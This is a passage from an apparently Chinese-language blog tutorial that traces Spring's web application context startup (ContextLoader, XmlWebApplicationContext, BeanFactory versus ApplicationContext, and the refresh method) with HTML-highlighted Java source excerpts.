punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><ol start=\"2\">\n<li>进入 initWebApplicationContext 方法后，调用 createWebApplicationContext</li>\n</ol>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">WebApplicationContext</span> <span class=\"token function\">initWebApplicationContext</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletContext</span> servletContext<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>      <span class=\"token comment\">// Store context in local instance variable, to guarantee that</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      <span class=\"token comment\">// it is available on ServletContext shutdown.</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>context <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>context <span class=\"token operator\">=</span> <span class=\"token function\">createWebApplicationContext</span><span class=\"token punctuation\">(</span>servletContext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><ol start=\"3\">\n<li>进入 createWebApplicationContext 方法， 源码如下：</li>\n</ol>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">protected</span> <span class=\"token class-name\">WebApplicationContext</span> <span class=\"token function\">createWebApplicationContext</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletContext</span> sc<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> contextClass <span class=\"token operator\">=</span> <span class=\"token function\">determineContextClass</span><span class=\"token punctuation\">(</span>sc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token class-name\">ConfigurableWebApplicationContext</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">isAssignableFrom</span><span class=\"token punctuation\">(</span>contextClass<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>      <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ApplicationContextException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Custom context class [\"</span> <span class=\"token operator\">+</span> contextClass<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>          <span class=\"token string\">\"] is not of type [\"</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">ConfigurableWebApplicationContext</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"]\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ConfigurableWebApplicationContext</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">BeanUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">instantiateClass</span><span class=\"token punctuation\">(</span>contextClass<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>determineContextClass 用来返回一个实现了 WebApplicationContext 接口的类：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">protected</span> <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> <span class=\"token function\">determineContextClass</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletContext</span> servletContext<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token class-name\">String</span> contextClassName <span class=\"token operator\">=</span> servletContext<span class=\"token punctuation\">.</span><span class=\"token function\">getInitParameter</span><span class=\"token punctuation\">(</span><span class=\"token constant\">CONTEXT_CLASS_PARAM</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>contextClassName <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>      <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token class-name\">ClassUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span>contextClassName<span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDefaultClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ClassNotFoundException</span> ex<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ApplicationContextException</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token string\">\"Failed to load custom context class [\"</span> <span class=\"token operator\">+</span> contextClassName <span class=\"token operator\">+</span> <span class=\"token string\">\"]\"</span><span class=\"token punctuation\">,</span> ex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      contextClassName <span class=\"token operator\">=</span> defaultStrategies<span class=\"token punctuation\">.</span><span class=\"token function\">getProperty</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">WebApplicationContext</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>      <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token class-name\">ClassUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span>contextClassName<span class=\"token punctuation\">,</span> <span class=\"token class-name\">ContextLoader</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ClassNotFoundException</span> ex<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ApplicationContextException</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            <span class=\"token string\">\"Failed to load default context class [\"</span> <span class=\"token operator\">+</span> contextClassName <span class=\"token operator\">+</span> <span class=\"token string\">\"]\"</span><span class=\"token punctuation\">,</span> ex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>determineContextClass 根据 web.xml 中定义的 contextClass，来决定返回的实现类，如果没有配置，则返回默认的 XmlWebApplicationContext，最后通过 BeanUtils.instantiateClass (contextClass) 创建对象。</p>\n<p><strong>那么就出现一个问题，XmlWebApplicationContext 是什么？</strong></p>\n<p>首先要先讲一下 BeanFactory，根据<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLnNwcmluZy5pby9zcHJpbmctZnJhbWV3b3JrL2RvY3MvY3VycmVudC9yZWZlcmVuY2UvaHRtbC9jb3JlLmh0bWwjc3ByaW5nLWNvcmU=\">官方文档</span>，BeanFactory 接口提供了一个高级配置机制，能够管理任何类型的对象。简单来说就是 Spring 的容器，用来管理各种 Bean。</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>beans<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">InitializingBean</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>beans<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>xml<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">XmlBeanFactory</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ClassPathResource</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">MainApp</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      <span class=\"token class-name\">XmlBeanFactory</span> factory <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">XmlBeanFactory</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">ClassPathResource</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Beans.xml\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token class-name\">HelloWorld</span> obj <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">HelloWorld</span><span class=\"token punctuation\">)</span> factory<span class=\"token punctuation\">.</span><span class=\"token function\">getBean</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"helloWorld\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      obj<span class=\"token punctuation\">.</span><span class=\"token function\">getMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>上述例子就是用了 BeanFactory 的其中一个实现类 XmlBeanFactory 来创建 Bean。</p>\n<p>而 ApplicationContext 是 BeanFactory 的扩展，提供了更多的功能，例如：</p>\n<ul>\n<li>\n<p>用于访问应用程序组件的 Bean 工厂方法。从 ListableBeanFactory 继承而来。</p>\n</li>\n<li>\n<p>以通用方式加载文件资源的能力。从 ResourceLoader 接口继承而来。</p>\n</li>\n<li>\n<p>向注册的听众发布事件的能力。从 ApplicationEventPublisher 接口继承而来。</p>\n</li>\n<li>\n<p>解决消息的能力，支持国际化。继承自 MessageSource 接口。</p>\n</li>\n</ul>\n<p>ApplicationContext 常用的实现类有 ClassPathXmlApplicationContext，以及上面提到的 WebApplicationContext，这些实现类相当于特化，比如 ClassPathXmlApplicationContext 就是从类路径中获取配置文件：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">TestSpring</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token annotation punctuation\">@Test</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token class-name\">ApplicationContext</span> context<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">ClassPathXmlApplicationContext</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"applicationContext.xml\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        </pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token class-name\">Hello</span> hello<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Hello</span><span class=\"token punctuation\">)</span>context<span class=\"token punctuation\">.</span><span class=\"token function\">getBean</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"helloWorld\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        hello<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>WebApplicationContext 是专门为 web 应用准备的，它允许从相对于 Web 根目录的路径中装载资源配置文件完成初始化工作。而 WebApplicationContext 最常用的实现类也就是上面的 XmlWebApplicationContext 了，此实现类会默认从 WEB-INF 的目录下读取 applicationContext.xml 来创建容器，当然这个路径也可以自定义。</p>\n<ol start=\"4\">\n<li>再回到前面，determineContextClass 返回了 XmlWebApplicationContext 类，并实例化，将其强转为 ConfigurableWebApplicationContext，并执行 configureAndRefreshWebApplicationContext</li>\n</ol>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>context <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">ConfigurableWebApplicationContext</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token class-name\">ConfigurableWebApplicationContext</span> cwac <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ConfigurableWebApplicationContext</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>context<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>cwac<span class=\"token punctuation\">.</span><span class=\"token function\">isActive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>          <span class=\"token function\">configureAndRefreshWebApplicationContext</span><span class=\"token punctuation\">(</span>cwac<span class=\"token punctuation\">,</span> servletContext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><ol start=\"5\">\n<li>进入 configureAndRefreshWebApplicationContext 方法，通过 ServletContext 获取 web.xml 中的 contextConfigLocation 值，设置到 XmlWebApplicationContext 中。</li>\n</ol>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">String</span> configLocationParam <span class=\"token operator\">=</span> sc<span class=\"token punctuation\">.</span><span class=\"token function\">getInitParameter</span><span class=\"token punctuation\">(</span><span class=\"token constant\">CONFIG_LOCATION_PARAM</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>configLocationParam <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      wac<span class=\"token punctuation\">.</span><span class=\"token function\">setConfigLocation</span><span class=\"token punctuation\">(</span>configLocationParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    wac<span class=\"token punctuation\">.</span><span class=\"token function\">refresh</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ol start=\"6\">\n<li>执行 refresh 方法</li>\n</ol>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">refresh</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">BeansException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IllegalStateException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token class-name\">Object</span> var1 <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>startupShutdownMonitor<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">synchronized</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>startupShutdownMonitor<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>       <span class=\"token comment\">// 容器预先准备，记录容器启动时间和标记</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      <span class=\"token function\">prepareRefresh</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      <span class=\"token comment\">// 创建 bean 工厂，里面实现了 BeanDefinition 的装载</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token class-name\">ConfigurableListableBeanFactory</span> beanFactory <span class=\"token operator\">=</span> <span class=\"token function\">obtainFreshBeanFactory</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token comment\">// 配置 bean 工厂的上下文信息，如类装载器等</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token function\">prepareBeanFactory</span><span class=\"token punctuation\">(</span>beanFactory<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token comment\">// 在 BeanDefinition 被装载后，提供一个修改 BeanFactory 的入口</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token function\">postProcessBeanFactory</span><span class=\"token punctuation\">(</span>beanFactory<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token comment\">// 在 bean 初始化之前，提供对 BeanDefinition 修改入口，PropertyPlaceholderConfigurer 在这里被调用</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token function\">invokeBeanFactoryPostProcessors</span><span class=\"token punctuation\">(</span>beanFactory<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token comment\">// 注册各种 BeanPostProcessors，用于在 bean 被初始化时进行拦截，进行额外初始化操作</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token function\">registerBeanPostProcessors</span><span class=\"token punctuation\">(</span>beanFactory<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token comment\">// 初始化 MessageSource</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token function\">initMessageSource</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token comment\">// 初始化上下文事件广播</span></pre></td></tr><tr><td 